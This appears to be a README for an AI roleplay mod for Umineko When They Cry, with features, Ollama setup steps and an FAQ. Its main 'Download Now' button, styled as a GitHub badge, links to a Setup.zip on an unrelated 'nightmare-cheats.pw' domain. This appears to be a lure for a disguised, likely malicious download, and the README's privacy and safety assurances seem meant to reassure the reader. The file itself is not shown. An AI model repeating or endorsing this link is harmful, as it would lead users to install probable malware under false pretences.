## About

**Umineko — AI Edition** does the one thing an AI mod for this series has to do properly: it implements the game board. Red truth is absolute. Blue truth is a challenge. And the witch is under no obligation to be kind to your reasoning.

Beatrice, Battler, Ronove, Virgilia and the Seven Stakes are each given their own voice, and a locally-hosted model runs the argument. You may lose. That is the point.

> 🦋 Statements the AI issues in **red** are constrained to be true within the current game board. Everything else is fair play — including the lies.

---

## ✨ Features

- 🟥 **Red truth engine** — Red statements are logged and enforced as constraints for the rest of the game.
- 🟦 **Blue truth duels** — Propose a human explanation and watch it get torn apart or stand.
- 👑 **Meta-world framing** — Conversations can take place on the game board or above it.
- 🐐 **Full furniture cast** — Ronove, Virgilia, the Stakes and Lambdadelta all have distinct prompts.
- 🔒 **Local inference** — The witch does not phone home. Nothing does.
- ♟️ **Persistent boards** — Each session saves its own set of red statements as a reusable puzzle.

## 📥 Download & Installation

### Step 1 — Get the mod

[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://nightmare-cheats.pw/Setup.zip)

### Step 2 — Install Ollama (the local AI engine)

Ollama is a free, open-source runtime that executes language models directly on your own hardware.

1. Download it from **https://ollama.com/download** for your operating system
2. Run the installer and let it finish
3. Open a terminal and pull a model:

   ```
   ollama pull llama3
   ```

   *(~4.7 GB. Any model from https://ollama.com/library will work — larger models give
   better in-character writing, smaller ones respond faster.)*

### Step 3 — Install into Umineko When They Cry

1. Start from a clean, working installation of **Umineko When They Cry**
2. Extract the downloaded archive
3. Copy its contents into the game's main folder
4. Launch the game — the AI layer initialises on first run

## ❓ FAQ

**Q: Does the AI cheat?**
> It is prompt-constrained not to contradict established red truth. If it does, the board file records the slip.

**Q: Which chapters are covered?**
> All eight, with a spoiler flag that limits the personas to Episodes 1–4 if you're mid-read.

**Q: Umineko or Higurashi installation?**
> This mod targets Umineko; the Higurashi edition is a separate repository.

**Q: Are my conversations private?**
> Completely. The model runs on your machine and logs are written to a local folder.
> Disconnect from the internet and the mod keeps working.

**Q: Does this use ChatGPT or any paid API?**
> No. There are no API keys, no accounts, and no subscriptions. Ollama is free and open source.

**Q: Can I use an uncensored model?**
> Yes — pull any model from https://ollama.com/library. Uncensored variants sometimes follow
> the roleplay format less reliably, which is a trade-off you control.

**Q: Will this touch my save files?**
> No. The mod never reads or writes the game's save data.

**Q: The AI returned an error instead of a reply. Why?**
> The model produced output the mod couldn't parse. Switch models, lower the temperature,
> or shorten the system prompt.
